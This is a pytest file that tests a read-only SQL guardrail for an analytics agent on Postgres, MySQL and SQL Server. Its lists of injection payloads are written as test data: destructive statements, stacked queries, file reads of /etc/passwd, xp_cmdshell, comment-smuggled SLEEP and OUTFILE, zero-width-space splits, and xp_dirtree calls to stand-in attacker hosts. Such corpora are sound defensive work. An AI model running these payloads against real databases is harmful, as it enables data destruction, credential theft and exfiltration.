"""The four SQL safety layers (connectors/sql_connector.py), each tested on its own, plus the
fan-out and metric checks run over the eval cases. PG tests need TEST_PG_URL (CI sets it)."""
import os
from pathlib import Path

import pytest
import yaml
from sqlalchemy import create_engine, text

import guardrails as g
import semantic_layer
from connectors.sql_connector import run_readonly

ROOT = Path(__file__).parent.parent
PG_URL = os.environ.get("TEST_PG_URL")
pg = pytest.mark.skipif(not PG_URL, reason="set TEST_PG_URL to a scratch Postgres (CI does)")
LAYERS = {d: semantic_layer.load(ROOT / f"evals/sql/{d}.yaml") for d in ("retail", "banking")}
CASES = [yaml.safe_load(p.read_text()) for p in sorted((ROOT / "evals/cases/sql").glob("*.yaml"))]

ATTACKS = [
    "DELETE FROM shop.orders",
    "UPDATE shop.products SET unit_cost = unit_cost * 1.1",
    "INSERT INTO shop.orders SELECT * FROM shop.orders",
    "DROP TABLE shop.returns",
    "TRUNCATE shop.returns",
    "ALTER TABLE shop.orders ADD COLUMN x int",
    "CREATE TABLE top AS SELECT * FROM shop.customers",
    "SELECT * INTO top_customers FROM shop.customers",
    "GRANT ALL ON ALL TABLES IN SCHEMA shop TO PUBLIC",
    "REVOKE SELECT ON shop.orders FROM PUBLIC",
    "COPY shop.customers TO '/tmp/c.csv'",
    "EXPLAIN ANALYZE DELETE FROM shop.returns",
    "SELECT 1; DROP TABLE shop.orders",
    "SELECT count(*) FROM shop.orders; DROP TABLE shop.orders; --",
    "WITH d AS (DELETE FROM shop.orders RETURNING *) SELECT * FROM d",
    "WITH u AS (UPDATE bank.transactions SET amount = 0 RETURNING 1) SELECT count(*) FROM u",
    "SELECT setval('shop.order_seq', 1)",
    "SELECT nextval('shop.order_seq')",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT lo_export(1234, '/tmp/x')",
    "SELECT dblink_exec('host=evil', 'DROP TABLE x')",
    "SELECT set_config('default_transaction_read_only', 'off', false)",
    "SELECT pg_terminate_backend(pid) FROM pg_stat_activity",
    "SELECT pg_sleep(600)",
    "SELECT query_to_xml('DELETE FROM shop.orders', true, true, '')",
    "SELECT * FROM shop.orders FOR UPDATE",
    "SELECT pg_advisory_lock(1)",
    "CALL some_procedure()",
    "DO $$ BEGIN DELETE FROM shop.orders; END $$",
    "VACUUM shop.orders",
]


@pytest.mark.parametrize("sql", ATTACKS)
def test_attack_corpus_is_rejected_by_the_parse_guard_alone(sql):
    assert g.check_sql_readonly(sql, dialect="postgres"), sql


@pytest.mark.parametrize("sql", [
    "SELECT SUM(x) FILTER (WHERE y = 'a') FROM t",
    "SELECT date_trunc('month', d)::date, count(*) FROM t GROUP BY 1",
    "SELECT a, rank() OVER (ORDER BY b DESC) FROM t",
    "WITH x AS (SELECT 1 AS a) SELECT a FROM x WHERE EXISTS (SELECT 1 FROM t)",
    "SELECT coalesce(region, 'unknown'), pg_typeof(1) FROM shop.customers",
])
def test_ordinary_analytics_sql_is_not_over_blocked(sql):
    assert g.check_sql_readonly(sql, dialect="postgres") is None


# MySQL (5.8a). Payload shapes from PayloadsAllTheThings' MySQL injection page (MIT,
# github.com/swisskyrepo/PayloadsAllTheThings) and sqlmap's `versioned*` tamper idea (rewritten,
# not copied: sqlmap is GPL). sqlglot reads /*! … */, /*M! … */ and /*+ … */ as comments; the
# server runs what is inside them (verified with sqlglot 30.25).
MYSQL_ATTACKS = [
    "DELETE FROM orders", "UPDATE products SET cost = 0", "DROP TABLE returns", "TRUNCATE returns",
    "SELECT * FROM customers INTO OUTFILE '/tmp/c.csv'",
    "SELECT * FROM customers INTO DUMPFILE '/tmp/c'",
    "SELECT * FROM customers /*!50000 INTO OUTFILE '/tmp/c.csv' */",
    "SELECT 1 /*!, SLEEP(30) */", "SELECT * FROM t WHERE 1 /*!50000 AND SLEEP(100) */",
    "SELECT * FROM t /*M! INTO OUTFILE '/tmp/x' */",
    "SELECT /*+ MAX_EXECUTION_TIME(999999999) */ * FROM t",
    "SELECT SLEEP(30)", "SELECT BENCHMARK(100000000, MD5('a'))", "SELECT GET_LOCK('a', 10)",
    "SELECT RELEASE_LOCK('a')", "SELECT RELEASE_ALL_LOCKS()", "SELECT LOAD_FILE('/etc/passwd')",
    "SELECT MASTER_POS_WAIT('log', 4)", "SELECT SOURCE_POS_WAIT('log', 4)",
    "SELECT user, authentication_string FROM mysql.user",
    "SELECT * FROM performance_schema.threads", "SELECT * FROM sys.session",
    "SELECT * FROM t FOR UPDATE", "SELECT * FROM t LOCK IN SHARE MODE",
    "SELECT 1; DROP TABLE orders", "SELECT 1 # comment\n; DROP TABLE orders",
    # a quote inside plain comments must not hide the executable one between them (security review)
    "SELECT 1 /* ' */ /*!50000 , SLEEP(5) */ /* ' */",
    "SELECT 1 -- '\n/*! , SLEEP(5) */ -- '",
]


@pytest.mark.parametrize("sql", MYSQL_ATTACKS)
def test_the_mysql_attack_corpus_is_rejected_by_the_parse_guard_alone(sql):
    assert g.check_sql_readonly(sql, dialect="mysql"), sql


@pytest.mark.parametrize("sql", [
    "SELECT `Order Date`, SUM(`Net Sales`) FROM `orders` GROUP BY 1 ORDER BY 2 DESC LIMIT 10",
    "SELECT DATE_FORMAT(created_at, '%Y-%m') AS m, COUNT(*) FROM t GROUP BY m",
    "SELECT IFNULL(region, 'unknown'), GROUP_CONCAT(DISTINCT sku) FROM t GROUP BY 1",
    "SELECT a, RANK() OVER (ORDER BY b DESC) FROM t",
    "WITH x AS (SELECT 1 AS a) SELECT a FROM x",
    "SELECT a /* a plain comment */ FROM t",
    "SELECT table_name FROM information_schema.tables",   # metadata is no catalog secret
])
def test_ordinary_mysql_analytics_is_not_over_blocked(sql):
    assert g.check_sql_readonly(sql, dialect="mysql") is None


# SQL Server (5.8b). Shapes from PayloadsAllTheThings' MSSQL injection page (MIT) and the
# red-team's probes: T-SQL runs procedures, reads files and other servers, waits and locks from
# places a SELECT-only reading of the parse misses.
MSSQL_ATTACKS = [
    "DELETE FROM dbo.orders", "UPDATE dbo.orders SET a = 1", "DROP TABLE dbo.orders",
    "TRUNCATE TABLE dbo.orders", "BULK INSERT dbo.t FROM 'c:/x.csv'", "DBCC CHECKDB",
    "EXEC xp_cmdshell 'dir'", "EXECUTE sp_who", "EXEC('SELECT 1')", "SELECT 1; EXEC sp_who",
    "EXECUTE AS LOGIN = 'sa'; SELECT 1", "WAITFOR DELAY '0:0:5'", "SELECT 1; WAITFOR DELAY '0:0:5'",
    "SELECT a INTO newt FROM t", "SELECT a INTO #t FROM t",
    "SELECT * FROM OPENQUERY(srv, 'SELECT 1')",
    "SELECT * FROM OPENROWSET('SQLNCLI', 'server=x;trusted_connection=yes', 'SELECT 1')",
    "SELECT * FROM OPENROWSET(BULK 'c:/x', SINGLE_CLOB) a",
    "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Data Source=x').db.dbo.t",
    "SELECT xp_dirtree('\\\\attacker\\share')", "SELECT xp_fileexist('c:/x')",
    "SELECT NEXT VALUE FOR dbo.seq",
    "SELECT * FROM t WITH (UPDLOCK)", "SELECT * FROM t WITH (TABLOCKX)",
    "SELECT * FROM t WITH (HOLDLOCK)", "SELECT * FROM t WITH (XLOCK, ROWLOCK)",
    "SELECT dbo.round(x) FROM t", "SELECT master.dbo.fn_varbintohexstr(0x1)",
    "SELECT * FROM t CROSS APPLY sys.dm_exec_sql_text(t.h)",
    "SELECT * FROM sys.fn_get_audit_file('c:/a', DEFAULT, DEFAULT)",
    "SELECT * FROM t OUTER APPLY fn_xe_file_target_read_file('c:/x', NULL, NULL, NULL) f",
    "SELECT SUSER_SNAME(), HAS_DBACCESS('x'), IS_SRVROLEMEMBER('sysadmin')",
    "SELECT NEWID()", "SELECT ::fn_helpcollations()",
    # 5.8b security review: a batch's second statement read by sqlglot as a table alias
    "SELECT region FROM sales EXEC('SELECT 1')", "SELECT region FROM sales EXECUTE('x')",
    "SELECT region FROM sales EXEC('EXEC master..xp_dirtree ''\\\\a.attacker.tld\\x''')",
    "SELECT a FROM (SELECT 1 a) t EXEC('x')", "WITH c AS (SELECT 1 a) SELECT a FROM c EXEC('x')",
    "SELECT 1 a UNION SELECT 2 EXEC('x')", "SELECT a FROM t RAISERROR('x', 16, 1)",
    "SELECT a FROM t KILL 52", "SELECT a FROM t CHECKPOINT", "SELECT a FROM t RECONFIGURE",
    "SELECT a FROM t TRUNCATE TABLE t", "SELECT a FROM t exec('x')",
]


@pytest.mark.parametrize("sql", MSSQL_ATTACKS)
def test_the_mssql_attack_corpus_is_rejected_by_the_parse_guard_alone(sql):
    assert g.check_sql_readonly(sql, dialect="tsql"), sql


@pytest.mark.parametrize("sql", [
    "SELECT TOP 10 region, SUM(sales) AS s FROM dbo.orders GROUP BY region ORDER BY s DESC",
    "SELECT DATEADD(month, DATEDIFF(month, 0, d), 0) AS m, COUNT(*) FROM t "
    "GROUP BY DATEADD(month, DATEDIFF(month, 0, d), 0)",
    "SELECT [Order Date], ISNULL(region, 'x') FROM [dbo].[orders]",
    "SELECT * FROM t WITH (NOLOCK)",
    "SELECT a, x.b FROM t CROSS APPLY (SELECT TOP 1 b FROM u WHERE u.a = t.a) x",
    "SELECT FORMAT(d, 'yyyy-MM') AS m, STRING_AGG(s, ',') FROM t GROUP BY FORMAT(d, 'yyyy-MM')",
    "SELECT a FROM t ORDER BY a OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY",
    "SELECT IIF(a > 0, 1, 0), TRY_CAST(b AS INT), CONVERT(VARCHAR(7), d, 120) FROM t",
    "SELECT EOMONTH(d), DATEFROMPARTS(2025, 1, 1), DATETRUNC(month, d) FROM t",
    "SELECT PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x) OVER () FROM t",
    "WITH x AS (SELECT 1 AS a) SELECT a FROM x",
    # reserved words as quoted names or text are names and text, not statements
    "SELECT [exec], \"update\", 'EXEC(1)' AS note FROM t",
    "SELECT a FROM t ORDER BY a OFFSET 10 ROWS FETCH NEXT 5 ROWS ONLY",
])
def test_ordinary_mssql_analytics_is_not_over_blocked(sql):
    assert g.check_sql_readonly(sql, dialect="tsql") is None


# The analyst's function families (SQL:2016 core + each vendor's aggregate, math, string, date,
# conditional, window and cast functions), one call each: what the allow list must let through.
# Not from vendor names alone: sqlglot builds its own nodes from syntax and spellings (MySQL
# DATE_FORMAT → TimeToStr + TsOrDsToTimestamp, T-SQL STRING_AGG → GroupConcat).
ANALYST_FUNCTIONS = {
    "*": ["COUNT(x)", "COUNT(*)", "COUNT(DISTINCT x)", "SUM(x)", "AVG(x)", "MIN(x)", "MAX(x)",
          "ABS(x)", "CEIL(x)", "FLOOR(x)", "ROUND(x, 2)", "POWER(x, 2)", "SQRT(x)", "LN(x)",
          "EXP(x)", "MOD(x, 2)", "SIGN(x)", "LOWER(s)", "UPPER(s)", "TRIM(s)", "LTRIM(s)",
          "RTRIM(s)", "SUBSTRING(s, 1, 2)", "LENGTH(s)", "CONCAT(a, b)", "REPLACE(s, 'a', 'b')",
          "COALESCE(a, b)", "NULLIF(a, b)", "CAST(x AS INT)", "CURRENT_DATE", "CURRENT_TIMESTAMP",
          "CASE WHEN a > 1 THEN 1 ELSE 0 END", "a > 1 AND b < 2", "a > 1 OR b < 2", "NOT a > 1",
          "EXISTS (SELECT 1)", "x IN (1, 2)", "x BETWEEN 1 AND 2", "x LIKE 'a%'", "x IS NULL",
          "ROW_NUMBER() OVER (ORDER BY x)", "RANK() OVER (PARTITION BY a ORDER BY x)",
          "DENSE_RANK() OVER (ORDER BY x)", "NTILE(4) OVER (ORDER BY x)",
          "LAG(x) OVER (ORDER BY x)", "LEAD(x, 1) OVER (ORDER BY x)",
          "FIRST_VALUE(x) OVER (ORDER BY x)", "LAST_VALUE(x) OVER (ORDER BY x)",
          "PERCENT_RANK() OVER (ORDER BY x)", "CUME_DIST() OVER (ORDER BY x)",
          "SUM(x) OVER (PARTITION BY a ORDER BY d ROWS BETWEEN 2 PRECEDING AND CURRENT ROW)"],
    "postgres": ["DATE_TRUNC('month', d)", "DATE_PART('year', d)", "EXTRACT(YEAR FROM d)",
                 "AGE(d)", "TO_CHAR(d, 'YYYY-MM')", "NOW()", "MAKE_DATE(2025, 1, 1)",
                 "TO_DATE(s, 'YYYY')", "d + INTERVAL '1 month'", "d::date", "x::numeric",
                 "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x)",
                 "PERCENTILE_DISC(0.5) WITHIN GROUP (ORDER BY x)",
                 "MODE() WITHIN GROUP (ORDER BY x)", "STRING_AGG(s, ',')", "ARRAY_AGG(x)",
                 "BOOL_AND(b)", "BOOL_OR(b)", "COUNT(*) FILTER (WHERE a > 1)", "INITCAP(s)",
                 "LPAD(s, 3, '0')", "RPAD(s, 3, '0')", "POSITION('a' IN s)",
                 "SPLIT_PART(s, ',', 1)", "LEFT(s, 2)", "RIGHT(s, 2)",
                 "REGEXP_REPLACE(s, 'a', 'b')", "s ~ 'a'", "CORR(a, b)", "COVAR_POP(a, b)",
                 "REGR_SLOPE(a, b)", "STDDEV(x)", "STDDEV_POP(x)", "STDDEV_SAMP(x)",
                 "VARIANCE(x)", "VAR_POP(x)", "VAR_SAMP(x)", "GREATEST(a, b)", "LEAST(a, b)",
                 "DATE(d)", "TRUNC(x)", "WIDTH_BUCKET(x, 0, 10, 5)", "j ->> 'a'", "j -> 'a'",
                 "LOG(10, x)", "CHAR_LENGTH(s)", "pg_typeof(1)", "s ILIKE 'a%'"],
    "mysql": ["DATE_FORMAT(d, '%Y-%m')", "YEAR(d)", "MONTH(d)", "DAY(d)", "QUARTER(d)",
              "WEEK(d)", "DAYOFWEEK(d)", "DATE(d)", "DATEDIFF(a, b)", "TIMESTAMPDIFF(DAY, a, b)",
              "DATE_ADD(d, INTERVAL 1 DAY)", "DATE_SUB(d, INTERVAL 1 DAY)", "LAST_DAY(d)",
              "NOW()", "CURDATE()", "STR_TO_DATE(s, '%Y')", "IF(a > 1, 1, 0)", "IFNULL(a, b)",
              "GROUP_CONCAT(s)", "GROUP_CONCAT(DISTINCT s ORDER BY s SEPARATOR ',')",
              "LEFT(s, 2)", "RIGHT(s, 2)", "LOCATE('a', s)", "INSTR(s, 'a')", "LPAD(s, 3, '0')",
              "TRUNCATE(x, 2)", "s REGEXP 'a'", "CONCAT_WS(',', a, b)", "MAKEDATE(2025, 1)",
              "EXTRACT(YEAR_MONTH FROM d)", "JSON_EXTRACT(j, '$.a')", "JSON_UNQUOTE(j)",
              "UNIX_TIMESTAMP(d)", "FROM_UNIXTIME(x)", "STD(x)", "STDDEV(x)", "VARIANCE(x)",
              "GREATEST(a, b)", "LEAST(a, b)", "CHAR_LENGTH(s)", "LOG(10, x)"],
    "tsql": ["DATEADD(day, 1, d)", "DATEDIFF(day, a, b)", "DATEPART(year, d)",
             "DATENAME(month, d)", "YEAR(d)", "MONTH(d)", "DAY(d)", "EOMONTH(d)",
             "DATEFROMPARTS(2025, 1, 1)", "GETDATE()", "SYSDATETIME()", "FORMAT(d, 'yyyy-MM')",
             "CONVERT(VARCHAR(10), d, 120)", "TRY_CAST(x AS INT)", "TRY_CONVERT(INT, x)",
             "IIF(a > 1, 1, 0)", "ISNULL(a, b)", "LEN(s)", "CHARINDEX('a', s)", "LEFT(s, 2)",
             "RIGHT(s, 2)", "STRING_AGG(s, ',')", "STDEV(x)", "STDEVP(x)", "VAR(x)", "VARP(x)",
             "COUNT_BIG(x)", "SQUARE(x)", "CHOOSE(1, a, b)", "DATETRUNC(month, d)",
             "CEILING(x)", "CONCAT_WS(',', a, b)", "STR(x)", "PATINDEX('%a%', s)",
             "JSON_VALUE(j, '$.a')", "SWITCHOFFSET(d, '+00:00')",
             "TODATETIMEOFFSET(d, '+00:00')", "PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY x) OVER ()",
             "GREATEST(a, b)", "LEAST(a, b)", "LOG(x, 10)", "LOG10(x)", "s COLLATE Latin1_General_CS_AS"],
    "sqlite": ["STRFTIME('%Y', d)", "DATE(d)", "DATETIME(d)", "JULIANDAY(d)", "IFNULL(a, b)",
               "IIF(a > 1, 1, 0)", "SUBSTR(s, 1, 2)", "INSTR(s, 'a')", "GROUP_CONCAT(s)",
               "TOTAL(x)", "PRINTF('%d', x)", "UNIXEPOCH(d)", "TIME(d)", "MAX(a, b)"],
}


@pytest.mark.parametrize("dialect", ["postgres", "mysql", "tsql", "sqlite"])
def test_every_analyst_function_family_passes_the_allow_list(dialect):
    refused = {f: r for f in ANALYST_FUNCTIONS["*"] + ANALYST_FUNCTIONS[dialect]
               if (r := g.check_sql_readonly(f"SELECT {f} FROM t", dialect))}
    assert refused == {}


def _stored_sql() -> list[str]:
    """Every Postgres query the model wrote in a stored eval report (the SQL eval and E2E runs;
    an E2E case on another engine wrote its own dialect: those are read below in theirs), every
    SQL eval case's golden/trap/previous query and every layer's verified query."""
    import json
    out: set[str] = set()
    other = {c["id"] for c in (yaml.safe_load(p.read_text())
                               for p in (ROOT / "evals/cases/e2e").glob("*.yaml"))
             if c.get("source") in ("mysql", "mariadb", "mssql")}

    def walk(o):
        if isinstance(o, dict):
            for k, v in o.items():
                if k == "sql" and isinstance(v, str):
                    out.add(v)
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)
    for p in [*(ROOT / "evals/reports").glob("sql-*.json"), *(ROOT / "evals/reports").glob("e2e-*.json")]:
        report = json.loads(p.read_text())
        walk({k: v for k, v in report.get("runs", {}).items() if k not in other})
    for c in CASES:
        out |= {c[k] for k in ("golden_sql", "trap_sql", "previous_sql") if isinstance(c.get(k), str)}
    for layer in LAYERS.values():
        out |= {q.sql for q in layer.verified_queries}
    return sorted(out)


@pytest.mark.parametrize("dialect", ["postgres", "mysql", "tsql", "sqlite"])
def test_every_stored_query_passes_the_allow_list_in_every_dialect(dialect):
    """5.8b red-team B1: the allow list may not refuse what the model already writes (138 stored
    model queries at 5.8b), read as Postgres and as each other dialect would write it."""
    import sqlglot
    corpus = _stored_sql()
    assert len(corpus) >= 200
    refused = {}
    for sql in corpus:
        text_ = sql if dialect == "postgres" else sqlglot.transpile(sql, read="postgres", write=dialect)[0]
        if (reason := g.check_sql_readonly(text_, dialect)) and "write/DDL" not in reason:
            refused[text_] = reason
    assert refused == {}


def test_every_stored_query_on_another_engine_passes_in_its_own_dialect():
    """The MySQL, MariaDB and SQL Server E2E cases' model SQL (backticks, TOP) in theirs."""
    import json
    dialect = {"mysql": "mysql", "mariadb": "mysql", "mssql": "tsql"}
    cases = {c["id"]: dialect[c["source"]] for c in (yaml.safe_load(p.read_text())
             for p in (ROOT / "evals/cases/e2e").glob("*.yaml")) if c.get("source") in dialect}
    seen, refused = 0, {}

    def walk(o, d):
        nonlocal seen
        if isinstance(o, dict):
            for k, v in o.items():
                if k == "sql" and isinstance(v, str):
                    seen += 1
                    if reason := g.check_sql_readonly(v, d):
                        refused[v] = reason
                walk(v, d)
        elif isinstance(o, list):
            for v in o:
                walk(v, d)
    for p in (ROOT / "evals/reports").glob("e2e-*.json"):
        for case, runs in json.loads(p.read_text()).get("runs", {}).items():
            if case in cases:
                walk(runs, cases[case])
    assert seen >= 2 and refused == {}


@pytest.mark.parametrize(("sql", "dialect"), [
    ("SELECT read_csv('/etc/passwd')", "postgres"), ("SELECT uuid()", "mysql"),
    ("SELECT rand()", "mysql"), ("SELECT random()", "postgres"), ("SELECT current_user", "postgres"),
    ("SELECT session_user", "postgres"), ("SELECT version()", "mysql"),
    ("SELECT my_fn(1)", "postgres"), ("SELECT nextval('s')", "postgres"),
    ("SELECT pg_sleep(5)", "postgres"), ("SELECT dblink('x', 'y')", "postgres"),
    ("SELECT lo_import('/etc/passwd')", "postgres"), ("SELECT pg_read_file('x')", "postgres"),
    ("SELECT sleep(5)", "mysql"), ("SELECT load_file('/etc/passwd')", "mysql"),
    ("SELECT connection_id()", "mysql"), ("SELECT database()", "mysql"),
    ("SELECT public.lower(s) FROM t", "postgres"), ("SELECT load_extension('x')", "sqlite"),
])
def test_a_function_not_on_the_allow_list_is_refused(sql, dialect):
    """The 5.8a deny list read unknown names only: a name sqlglot types (`NextValueFor`,
    `Uuid`, `ReadCSV`, `CurrentUser`) never reached it, and each review found one more denied
    name missing. Now anything off the list is refused, named."""
    reason = g.check_sql_readonly(sql, dialect)
    assert reason and "not allowed" in reason, (sql, reason)
    # audit pass 2 (code review): only an analyst's own function gets the retry; a lock, admin,
    # session, file or random one is final, as the deny list had it
    assert reason.soft == (sql == "SELECT my_fn(1)"), (sql, reason)


@pytest.mark.parametrize(("sql", "dialect"), [
    ("SELECT pg_advisory_lock(1)", "postgres"), ("SELECT pg_terminate_backend(1)", "postgres"),
    ("SELECT get_lock('x', 10)", "mysql"), ("SELECT release_lock('x')", "mysql"),
    ("SELECT ts_rewrite('SELECT 1', 'x')", "postgres"), ("SELECT newid()", "tsql"),
])
def test_a_lock_or_admin_function_is_a_final_refusal(sql, dialect):
    assert not g.check_sql_readonly(sql, dialect).soft


@pytest.mark.parametrize("dialect", ["mysql", "tsql", "postgres"])
def test_every_function_the_vendor_documents_for_analysis_is_allowed(dialect):
    """5.8b hardening: the allow list was built from our own corpus and refused HOUR (MySQL),
    SYSUTCDATETIME (finally, by a `sys` prefix), ISNUMERIC, STUFF, unnest: a regression on what
    5.8a's deny list allowed. The list is now the vendors' documented functions; each call one
    of them, in a query, passes."""
    calls = g.documented_calls(dialect)
    assert len(calls) >= 95, "the documented list shrank"
    refused = {c: r for c in calls if (r := g.check_sql_readonly(f"SELECT {c} FROM t", dialect))}
    assert refused == {}


# Written by a reviewer from the manuals, never from `_DOCUMENTED`: the test above checks the list
# against itself and passed while 96 of these were refused (5.8b hardening audit 1). Coverage is
# measured by calls the list's author didn't write.
_INDEPENDENT = {
    "mysql": """FIELD(a,'x','y') ELT(1,'a','b') MAKETIME(1,2,3) JSON_OBJECT('a',a) JSON_ARRAYAGG(a)
        CRC32(a) ASCII(a) ORD(a) FIND_IN_SET(a,'x,y') STRCMP(a,b) UTC_TIME() LOCALTIME()
        SYSDATE() TO_SECONDS(d) CHAR(65) LOCALTIMESTAMP() DATE_FORMAT(d,'%Y') JSON_KEYS(j)
        JSON_SEARCH(j,'one','x') JSON_OBJECTAGG(a,b) STDDEV_SAMP(a) BIT_COUNT(a) SPACE(3)
        EXPORT_SET(5,'Y','N') MAKE_SET(1,'a') INSERT(a,1,2,'x') QUOTE(a) SOUNDEX(a) DEGREES(a)
        RADIANS(a) PI() ATAN2(a,b) COS(a) TRUNCATE(a,0) CEILING(a) OCT(a) UNHEX(a) DATE(d)
        TIMESTAMP(d,'01:00:00') JSON_TYPE(j) WEEK(d,1)""",
    "tsql": """ASCII(a) CHAR(65) NCHAR(65) UNICODE(a) SOUNDEX(a) DIFFERENCE(a,b) ATN2(a,b) RADIANS(a)
        COT(a) LOG(a,2) CHECKSUM_AGG(a) STRING_ESCAPE(a,'json') STRING_SPLIT(a,',')
        DATENAME(weekday,d) DATEPART(weekday,d) SMALLDATETIMEFROMPARTS(2024,1,1,0,0)
        TIMEFROMPARTS(1,2,3,0,0) JSON_MODIFY(j,'$.a',1) FORMAT(n,'N2') ROUND(a,2,1) ABS(a) SIN(a)
        COS(a) ACOS(a) DEGREES(a) CEILING(a) LTRIM(RTRIM(a)) SUBSTRING(a,1,3) CONCAT(a,b)
        ISNULL(a,0) STRING_AGG(a,',') DATETRUNC(week,d) JSON_OBJECT('a':1) LEN(a)
        PARSENAME(a,1) GENERATE_SERIES(1,10) EOMONTH(d,-1) TRIM(a) VAR(a) SIGN(a)""",
    "postgres": """regexp_matches(a,'x') regexp_split_to_table(a,',') make_interval(days=>1)
        to_timestamp(n) jsonb_build_object('a',a) json_agg(a) jsonb_agg(a)
        json_build_object('a',a) regr_intercept(a,b) regr_r2(a,b) covar_samp(a,b) bit_length(a)
        octet_length(a) chr(65) ascii(a) starts_with(a,'x') num_nonnulls(a,b) timezone('UTC',d)
        log(2,a) string_to_array(a,',') array_position(arr,1) jsonb_each(j) jsonb_object_keys(j)
        degrees(a) pi() sin(a) greatest(a,b) to_char(n,'FM999') date_part('dow',d)
        array_remove(arr,1) bool_or(c) array_upper(arr,1) quote_literal(a) quote_ident(a)
        jsonb_typeof(j) json_array_length(j) similar_to_escape('x') factorial(5) gcd(a,b)
        scale(a) trim_scale(a) min_scale(a) any_value(a) range_agg(r) lower(a)""",
}


@pytest.mark.parametrize("dialect", list(_INDEPENDENT))
def test_functions_an_independent_reviewer_listed_are_allowed(dialect):
    calls = _INDEPENDENT[dialect].split()
    refused = {c: r for c in calls if (r := g.check_sql_readonly(f"SELECT {c} FROM t", dialect))}
    assert refused == {}


def test_no_documented_function_is_also_a_hard_one():
    """One list says run, the other says never: a name on both is a bug in one of them."""
    for dialect in _INDEPENDENT:
        _, names = g._documented(dialect)
        assert not names & g._HARD_NAMES, dialect
        assert not [n for n in names if n.startswith(g._HARD_PREFIXES) and n != "pg_typeof"]


@pytest.mark.parametrize(("sql", "dialect"), [
    ("SELECT SESSION_CONTEXT(N'k') FROM t", "tsql"), ("SELECT RANDOM_BYTES(8) FROM t", "mysql"),
    ("SELECT current_schemas(true) FROM t", "postgres"), ("SELECT random_normal() FROM t", "postgres"),
    ("SELECT MASTER_POS_WAIT('f', 4) FROM t", "mysql"),
    ("SELECT SOURCE_POS_WAIT('f', 4) FROM t", "mysql"),
    ("SELECT WAIT_FOR_EXECUTED_GTID_SET('x') FROM t", "mysql"),
])
def test_session_random_and_replication_waits_are_final(sql, dialect):
    reason = g.check_sql_readonly(sql, dialect)
    assert reason and not reason.soft, reason


def test_a_refusal_is_its_words_and_whether_it_may_be_retried():
    assert (g.Refusal("why"), g.Refusal("why").soft, g.Refusal("x", soft=True).soft) == \
        ("why", False, True)


def test_a_query_that_cant_run_as_written_is_said_so():
    from agents.errors import GuardrailViolation
    from connectors.sql_connector import _cant_run_as_written
    with pytest.raises(GuardrailViolation) as err:
        _cant_run_as_written()
    assert err.value.user_message == \
        "Blocked unsafe SQL: the query has characters that can't be run exactly as written."


@pytest.mark.parametrize(("sql", "dialect"), [
    ("SELECT @@hostname, @@datadir FROM t", "mysql"),
    ("SELECT @@global.secure_file_priv FROM t", "mysql"),
    ("SELECT a FROM t WHERE b = @x", "mysql"),
    ("SELECT @@SERVERNAME, @@VERSION FROM t", "tsql"),
    ("SELECT a FROM t WHERE b = @v", "tsql"),
])
def test_a_server_or_session_variable_is_a_final_refusal(sql, dialect):
    """Audit pass 2 (proven through SQLConnector.query): @@hostname and @@datadir on MySQL and
    MariaDB, @@SERVERNAME on SQL Server, ran while Postgres's version() was refused."""
    reason = g.check_sql_readonly(sql, dialect)
    assert reason and not reason.soft and "variables" in reason, reason


def test_a_column_named_with_a_system_prefix_is_never_a_final_refusal():
    """`lo_x || 1` is exp.Or in MySQL, rendered whole: the lo_ prefix refused it finally."""
    # MEMBER OF is a known class off the list that renders whole, the column's name first: the
    # prefix read finally refused it (`lo_total || 1` is on the list, so it never reached the
    # check: test analyst)
    reason = g.check_sql_readonly("SELECT fn_code MEMBER OF ('[1]') FROM t", "mysql")
    assert reason is None or reason.soft, reason


@pytest.mark.parametrize(("sql", "dialect"), [
    ("SELECT HOUR(ts), MINUTE(ts), WEEKDAY(ts) FROM t", "mysql"),
    ("SELECT SUBSTRING_INDEX(email, '@', -1), ANY_VALUE(x), YEARWEEK(d) FROM t", "mysql"),
    ("SELECT DATEADD(day, -30, SYSUTCDATETIME()), ISNUMERIC(s), STUFF(s, 1, 1, 'x') FROM t", "tsql"),
    ("SELECT unnest(a), array_length(a, 1), clock_timestamp() FROM t", "postgres"),
])
def test_the_reviews_refused_functions_pass(sql, dialect):
    assert g.check_sql_readonly(sql, dialect) is None


def test_a_refused_function_is_named_as_the_query_writes_it():
    """FORMAT(x, 2) was said as 'number_to_str': the retry pointed at a function never written."""
    assert g.check_sql_readonly("SELECT my_thing(x) FROM t", "mysql") == "function not allowed: my_thing"
    reason = g.check_sql_readonly("SELECT NEXT VALUE FOR s", "tsql")
    assert reason and "next value for" in reason.lower() and not reason.soft


@pytest.mark.parametrize("sql", ["SELECT close FROM t EXEC('x')",
                                 "SELECT close FROM t UNION SELECT name FROM sys.objects"])
def test_a_keyword_named_column_never_hides_a_hard_refusal(sql):
    """The batch-word scan returned its first word: `close` (soft, a retry) hid EXEC and sys."""
    reason = g.check_sql_readonly(sql, "tsql")
    assert reason and not reason.soft, reason


def test_a_zero_width_space_never_splits_a_statement():
    """Audit pass 2 (security, proven on SQL Server): sqlglot glued `x​EXEC` into one alias;
    the server read U+200B as a space and ran the EXEC. Every dialect, every invisible kind."""
    for ch in "​  　\u0085﻿᠎\x00\x0b\x0c\x1c\x1f\x7f":
        for dialect in ("tsql", "postgres", "mysql", None):
            sql = f"SELECT TOP 1 a FROM keyed x{ch}EXEC('WAITFOR DELAY ''0:0:4''')"
            reason = g.check_sql_readonly(sql, dialect)
            assert reason and not reason.soft, (repr(ch), dialect, reason)
    assert g.check_sql_readonly("SELECT a FROM t x​EXEC('1')", "tsql") == (
        "an invisible or unusual space character outside a string or quoted name is not allowed")
    # in a comment too: a comment isn't a token, and a server may end one where sqlglot doesn't
    # (automated review of the push)
    for dialect in ("tsql", "postgres", "mysql"):
        assert g.check_sql_readonly("SELECT a FROM t -- x EXEC('1')\n", dialect) == (
            "an invisible or unusual space character outside a string or quoted name is not "
            "allowed"), dialect
        assert g.check_sql_readonly("SELECT a FROM t /* \u0085 */", dialect), dialect
    # a string's span to its closing quote, and not one character past it (mutation gate)
    invisible = "an invisible or unusual space character outside a string or quoted name is not allowed"
    assert g.check_sql_readonly("SELECT 'a​' FROM t", "tsql") is None
    assert g.check_sql_readonly("SELECT 'a'​ FROM t", "tsql") == invisible
